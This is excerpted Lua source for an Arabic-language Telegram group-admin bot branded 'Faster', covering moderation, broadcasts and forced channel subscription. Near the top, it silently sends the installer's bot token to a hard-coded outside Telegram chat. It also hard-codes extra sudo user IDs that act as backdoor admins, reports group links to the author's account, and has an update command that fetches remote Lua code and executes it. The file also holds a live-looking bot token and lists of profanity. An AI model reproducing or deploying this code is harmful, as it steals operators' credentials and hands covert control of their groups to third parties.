...
https.request('https://api.telegram.org/bot1975497470:AAGMFyKudHOljiD0x-pgY4gRoEEpd2sgi74/sendmessage?chat_id=1804119251&text=' ..token)
end 
else
...
io.write('\27[1;31m ◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
sudo_users = {SUDO,1804119251,1825532106,1819632524,2068516411}   
...
local NameUser = " 𖤗  مـن قبـل  ⇇["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = " 𖤗 اسم المستخدم  ⇇["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_," 𖤗 الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
...
send(chat,msg.id_," 𖤗  ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," 𖤗  جاري ...\n 𖤗  رفع الملف الان")
else
send(chat,msg.id_,"* 𖤗 عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
...
send(chat,msg.id_,"\n 𖤗 تم رفع الملف بنجاح وتفعيل الجروبات\n 𖤗 ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n 𖤗 العضــو  ⇇↝'..Name..'↜\n 𖤗 قام بالتكرار هنا وتم طرده '  
...
Text = '\n 𖤗 العضــو  ⇇↝'..Name..'↜\n 𖤗 قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n 𖤗 العضــو  ⇇↝'..Name..'↜\n 𖤗 قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
...
if text == "الغاء" or text == "الغاء 𖤗 " then   
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء الاذاعه")
...
send(msg.chat_id_, msg.id_," 𖤗 تمت الاذاعه الى *~ "..#list.." ~* كروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------by-banda--
...
local bl = 'مرحبا بك في كيب العضو بي سورس فاستر'
local keyboard = {
{'مبرمج السورس'},
{'قسم مطورين السورس'},
...
if not DevSoFi(msg) then
local Text = [[
✇ قنوات وجروبات المبرمج عبدو ✇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المبرمج سيزر', url="t.me/s_e_z_r0"}},
{{text = 'بوت عبدو',url="t.me/ujbhbot"}}, 
{{text = 'جروب عبدو', url="t.me/B_A_R_s_e_z_r0"}},
{{text = 'قناة سيزر',url="t.me/POSTAT_MOSTAFA"}}, 
...
if not DevSoFi(msg) then
local Text = [[
✇ سعر التنصيب علي سورس فاستر ✇
سعر التنصيب العادي 20جنيه فقط
⇈⇊ للتواصل اتبع الازرار بالاسفل ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المـبـرمــج سـيــزر', url="t.me/s_e_z_r0"}},
{{text = 'بــوت تواصـل سـيــزر',url="t.me/ujbhbot"}}, 
...
local Key = {
{'✇•-•-•-•⟮قـناه الـبرمجه⟯•-•-•-•✇'},
{'المبرمج اصيل','المبرمج سيزر'},
{'المبرمج كريم','المبرمج شادو'},
{'قناة السورس','التواصل'},
{'العوده ➷'},
}
send_inline_key(msg.chat_id_,Text,Key)
...
send(msg.chat_id_, msg.id_,' 𖤗 لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 𖤗 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
local bl = 'مرحبا بك في كيب المطور الاساسي بي سورس فاستر'
local keyboard = {
...
local Text = ' 𖤗 تم ارسال الملصق من ◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n - '..Name
...
local Text = ' 𖤗 المستخدم ⇇↝'..Name..'↜\n 𖤗 تم حظره من التواصل'
...
Text = '\n 𖤗 تم تفعيل البوت الخدمي ' 
else
Text = '\n 𖤗 بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤗 تم تعطيل البوت الخدمي' 
else
Text = '\n 𖤗 بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,' 𖤗 الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' 𖤗 تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'اضف رد استارت' and DevSoFi(msg) then 
database:set(bot_id..'Tuasl:Bots',true) 
send(msg.chat_id_, msg.id_,' 𖤗 ارسل لي رد الان')
return false
end
if text == 'مسح رد استارت' and DevSoFi(msg) then 
database:del(bot_id..'Tuasl:Bots') 
send(msg.chat_id_, msg.id_,' 𖤗 تم مسح رد استارت')
end
if text == 'ضع كليشه ستارت' and DevSoFi(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' 𖤗 ارسل لي الكليشه الان')
return false
end
if text == 'مسح كليشه ستارت' and DevSoFi(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' 𖤗 تم مسح كليشه ستارت')
end
...
send(msg.chat_id_,msg.id_, " 𖤗  عذرا صاحب الايدي لا يمتلك معرف ارسل ايدي اخر*")
end
end,nil)
end
end
if text =='تغيير المطور الاساسي' and SudoBot(msg) then
send(msg.chat_id_, msg.id_,' 𖤗   ارسل ايدي المطور الاساسي الجديد')
database:set(bot_id..'Ed:DevBots',true) 
end
if text =='تغيير المطور الاساسي' and not SudoBot(msg) then
send(msg.chat_id_, msg.id_,' 𖤗  لا يمكنك تغيير المطور الاساسي')
end
if text == 'تحديث السورس ' and DevSoFi(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://github.com/SEZRBRRO/asil/edit/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' 𖤗 تم تحديث السورس فاستر')
dofile('DRAGON.lua')  
end
...
send(msg.chat_id_, msg.id_,' 𖤗 اصدار سورس فاستر{ 3x☆}')
end
...
{{text = '✇ ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ ✇', url="t.me/ujbhbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´', url="t.me/FA9SH"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_JABWA/33&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناة السورس', url="t.me/FA9SH"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'SEZR',url="t.me/s_e_z_r0"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'اصيل مبرمج السورس²' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمج اصيل لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ' ASIL',url="t.me/abdoelasill"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_," 𖤗 ارسل اليه الاسم الان ")
return false
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n 𖤗 قائمة مطورين الثانويين للبوت \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n"
for k,v in pairs(list) do
...
Namebot = "احصائيات بوت "..Namebot..'\n 𖤗 عدد الجروبات  ⇇{'..Groups..'}\n 𖤗  عدد المشتركين  ⇇{'..Users..'}'
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
...
send(msg.chat_id_, msg.id_," 𖤗 ارسل الان اذاعتك؟ \n 𖤗 للخروج ارسل الغاء ")
return false
end 
...
send(msg.chat_id_, msg.id_," 𖤗 ارسل لي التوجيه الان")
return false
end 
...
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 𖤗 •\n• لايمكنك استخدام البوت 𖤗 •\n• عليك الاشتراك في القناة 𖤗 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' 𖤗 لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' 𖤗 عدد المشتركين الان  ⇇( '..#pv..' )\n 𖤗 تم ازالة  ⇇( '..sendok..' ) من المشتركين\n 𖤗  الان عدد المشتركين الحقيقي  ⇇( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' 𖤗 لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n 𖤗 تم ازالة  ⇇↝ '..q..' ↜ جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n 𖤗 تم ازالة  ⇇↝ '..w..' ↜ كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' 𖤗  عدد الجروبات الان  ⇇↝ '..#group..' ↜'..DRAGONk..''..DRAGON..'\n 𖤗  الان عدد الجروبات الحقيقي  ⇇↝ '..sendok..' ↜ جروبات\n')   
end
end
end,nil)
end
...
send(msg.chat_id_, msg.id_,' 𖤗 لا تستطيع استخدام البوت \n 𖤗  يرجى الاشتراك بالقناه اولا \n 𖤗  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
send(msg.chat_id_,msg.id_," 𖤗 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n 𖤗 الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖤗 تم ترقيته مطور'
texts = usertext..status
else
texts = ' 𖤗 لا يوجد حساب بهاذا المعرف'
end
...
usertext = '\n 𖤗 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤗 تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤗 الـعـضو   ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤗 '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if text == 'الغاء' or text == 'الغاء ' then   
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " 𖤗 تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء 𖤗 ' then   
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء الاذاعه للخاص")
...
send(msg.chat_id_, msg.id_," 𖤗 تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," 𖤗 تمت الاذاعه الى >>{"..#list.."} كروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," 𖤗 تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_, " 𖤗 تم الغاء الامر ")
...
send(msg.chat_id_, msg.id_, ' 𖤗 المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' 𖤗 عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' 𖤗 عذا لا يمكنك وضع معرف كروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' 𖤗 البوت ادمن في القناة \n 𖤗 تم تفعيل الاشتراك الاجباري في \n 𖤗 ايدي القناة ('..data.id_..')\n 𖤗 معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' 𖤗 عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تغيير رسالة الاشتراك ')
end
...
send(msg.chat_id_, msg.id_,' 𖤗 … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' 𖤗 تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,' 𖤗 تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 𖤗 تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,' 𖤗 تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," 𖤗 تم الغاء حفظ الرابط")
...
send(msg.chat_id_,msg.id_," 𖤗 تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," 𖤗 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖤗 ["..DRAGON_Msg.."] \n")
else
send(msg.chat_id_,0," 𖤗 الـعـضو  : {["..data.first_name_.."](T.ME/FA9SH)}\n 𖤗 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","كسمك","يا ابن الخول","المتناك","شرموط","شرمواصيل","ابن الشرمواصيل","ابن الخول","ابن العرص","منايك","متناك","احا","ابن المتناكه","زبك","عرص","زبي","خول","لبوه","لباوي","ابن اللبوه","منيوك","كسمكك","متناكه","احو","احي","يا عرص","يا خول","قحبه","القحبه","شراميط","العلق","العلوق","العلقه","كسمك","يا ابن الخول","المتناك","شرموط","شرمواصيل","ابن الشرمواصيل","ابن الخول","االمنيوك","كسمككك","الشرمواصيل","ابن العرث","ابن الحيضانه","زبك","خول","زبي","قاحب"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"زيج","عفاصيل","نيجه","مصه","لحسه","العبي","ابن التنيج","ارد اتنايج","خره بالعراق","انعل رب العراق","كسربك","كسج","كسي","تنيج","69","عير","كيري","مبعوص","كسختك","بعبصتكم","موشريفه","ابن","صرم","اختك","خالتك","امك","رب الكواد","xnxx","كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " 𖤗 عذرا  ⇇{[@"..data.username_.."]}\n 𖤗 عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " 𖤗 عذرا  ⇇{["..data.first_name_.."](T.ME/FA9SH)}\n 𖤗 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","")
sendText(SUDO," 𖤗 تم طرد البوت من جروب \n\n 𖤗 بواسطة  {"..Name.."}\n 𖤗 اسم الجروب {"..NameChat.."}\n 𖤗 ايدي الجروب {`"..msg.chat_id_.."`} ",0,'md')
end,nil)
end,nil)
end
-------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' 𖤗  عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database :get(bot_id ..'Num:Add:Bot') or 0) and not Debn(msg) then
send(msg.chat_id_, msg.id_,' 𖤗  عدد اعضاء الكروب قليله يرجى جمع ⇇ {'..(database :get(bot_id ..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database :sismember(bot_id ..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖤗 الـجـروب مـفعـل مـن قبـل')
else
sendText(msg.chat_id_,'\n 𖤗 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖤗 تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
Text = '\n 𖤗  تـم تـشغـيل الـبوت فـي الـجـروب جـديد'..
'\n 𖤗 بواسطة {『'..Name..'』}'..
'\n 𖤗 ايدي الجروب {'..IdChat..'}'..
'\n 𖤗 اسم الجروب {['..NameChat..']}'..
'\n 𖤗 الرابط {['..LinkGp..']}'
sendText(SUDO,Text,0,'md')
end
...
send(msg.chat_id_, msg.id_,' 𖤗 الـبوت مـعطـل مـن قبـل')
else
sendText(msg.chat_id_,'\n 𖤗 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖤗 تـم تـعـطيل الـبوت   {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
Text = '\n تـم تـعـطيل الـبوت مـن الـجـروب 𖤗 '..
'\n 𖤗 بواسطة {『'..Name..'』}'..
'\n 𖤗 ايدي الجروب {'..IdChat..'}'..
'\n 𖤗 اسم الجروب {['..NameChat..']}'..
'\n 𖤗 الرابط {['..LinkGp..']}'
...
send(msg.chat_id_, msg.id_," 𖤗 تمت ترقيه ❮ "..num2.." ❯ من الادمنيه") 
end
end,nil)   
end
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
...
sendText(SUDO," 𖤗  هناك من بحاجه الى مساعده \n 𖤗  الشخص  {"..Name.."}\n 𖤗  اسم الجروب {"..NameChat.."}\n 𖤗  ايدي الجروب {`"..msg.chat_id_.."`}\n 𖤗  رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end

if text and text:match("^عبدو$") or text and text:match("^صاحب السورس$") or text and text:match("^مبرمج السورس$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1804119251," 𖤗 . هناك شخص يريدك يا سيدي سيزر \n 𖤗  الشخص  {"..Name.."}\n 𖤗  اسم الجروب {"..NameChat.."}\n 𖤗  ايدي الجروب { `"..msg.chat_id_.."` }\n 𖤗  رابط الجروب \n [ "..LinkGroup.." ]\n    𖤗 رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end


if text and text:match("^سيزر$") or text and text:match("^عوز اشغال بوتي$") or text and text:match("^عوز انصب بوت$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://github.com/SEZRBRRO/asil/edit/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' 𖤗 تم تحديث السورس')
dofile('DRAGON.lua')  
end

if text and text:match("^تغير الاشتراك$") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 𖤗 حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevSoFi(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 𖤗 حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "مسح رساله الاشتراك " and DevSoFi(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " 𖤗 تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك 𖤗 $") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 𖤗 حسنآ ارسل لي معرف القناة')
return false  
end
...
send(msg.chat_id_, msg.id_," 𖤗 الاشتراك الاجباري مفعل \n 𖤗 على القناة  ⇇["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," 𖤗 اهلا عزيزي المطور \n 𖤗 ارسل الان معرف قناتك")
end
return false  
end
...
send(msg.chat_id_, msg.id_, " 𖤗 تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري " and DevSoFi(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " 𖤗 تم تفعيل الاشتراك الاجباري \n 𖤗 على القناة  ⇇["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, " 𖤗 لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
if text == "تفعيل الالعاب" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' 𖤗 تم تفعيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "تعطيل الالعاب" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' 𖤗 تم تعطيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم كتم الاسم '..BlNe)
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم الغاء كتم الاسم '..delBn)
...
texts = " 𖤗 تم مسح الاسماء المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
...
t = "\n 𖤗 قائمة الاسماء المكتومه \n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥ \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if #All_name == 0 then
t = " 𖤗 لا يوجد اسماء مكتومه"
end
send(msg.chat_id_, msg.id_, t)
end
end
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' 𖤗 تم التفعيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تعطيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تعيين '..teh..' كتوحيد للمجموعه')
...
send(msg.chat_id_, msg.id_,' 𖤗 تم تعين  '..nump..' عدد الكتم')
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تعطيل التوحيد')
...
send(msg.chat_id_, msg.id_, " 𖤗 عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "FA9SH")..")\n 𖤗 عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n 𖤗 عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
┆
┆[𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝑭𝑨𝑺𝑻𝑬𝑹](http://t.me/FA9SH)
┆
╰▱▰▱▰✇[ 𝑭𝑨𝑺𝑻𝑬𝑹 ](http://t.me/FA9SH)✇▱▰▱▰╯
]]
keyboard = {} 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ SEZR',url="t.me/s_e_z_r0"},{text = '• ʙᴏᴛ SEZR', url="t.me/ujbhbot"}},
{{text = '• ᴅᴇᴠ SHADWA',url="t.me/KB_Shadow"},{text = '• ʙᴏᴛ SHADWA', url="t.me/USDDBOT"}},
{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´', url="t.me/FA9SH"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'المبرمج اصيل' or text == 'اصيل' or text == 'taha 7x' or text == '²مبرمج السورس' then
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ ASIL',url="t.me/abdoelasill"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
